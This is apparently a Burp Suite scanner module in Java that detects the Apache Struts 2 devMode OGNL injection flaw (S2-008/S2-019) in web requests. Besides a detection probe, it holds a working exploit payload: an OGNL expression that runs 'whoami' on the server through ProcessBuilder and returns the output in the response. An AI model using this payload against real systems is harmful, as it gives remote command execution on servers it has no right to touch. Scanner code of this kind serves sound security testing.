package module;

import burp.IModule;
import burp.IParameter;
import burp.IScanIssue;

import java.net.URLEncoder;

public class Devmode extends IModule {
    public Devmode() {
        //本地测试中发现cookie会对S2_008、S2_019的payload回显有影响，这里采用最简单的拼接验证
        poc = "debug=command&expression='"+injectMark[0]+"'%2b'"+injectMark[1]+"'";

        exp =
            "#a=(new java.lang.ProcessBuilder('whoami')).start()," +
            "#b=#a.getInputStream()," +
            "#c=new java.io.InputStreamReader(#b)," +
            "#d=new java.io.BufferedReader(#c)," +
            "#e=new char[50]," +
            "#d.read(#e)," +
            "#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()," +
            "#out.print(new java.lang.String(#e))," +
            "#out.flush()," +
            "#out.close()";
        exp = "debug=command&expression=" + URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }

        String[] parameters = poc.split("&");
        for (String parameter: parameters) {
            String[] tmp = parameter.split("=");
            String parameterName = tmp[0];
            String parameterValue = tmp[1];
            IParameter newParameter = helpers.buildParameter(parameterName, parameterValue, in);
            request = helpers.updateParameter(request, newParameter);
        }
        if (check()) {
            this.detail = exp;
            return creatCustomScanIssue();
        }
        return super.start();
    }
}
